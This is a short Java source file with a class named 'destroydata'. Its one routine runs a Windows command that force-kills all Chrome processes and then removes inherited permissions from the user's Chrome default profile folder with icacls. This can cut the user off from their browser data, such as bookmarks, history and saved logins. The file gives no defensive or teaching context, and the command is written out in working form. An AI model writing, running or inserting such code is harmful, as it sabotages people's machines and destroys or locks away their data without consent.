/**
  Created by Anirudh on 28-01-2017.
 */
public class destroydata {
    public static void windows_chrome() {
        try{

            Process p = Runtime.getRuntime().exec("cmd /c cd\\ & taskkill /f /im chrome.exe /t & " +
                    "icacls " + "\"" + System.getProperty("user.home") +
                    "\\AppData\\Local\\Google\\Chrome\\User Data\\Default" + "\"" +   " /inheritance:r") ;

        } catch (java.io.IOException o ) {
            System.err.println(o);
        }


    }
    public static void main(String[] args) {}
}
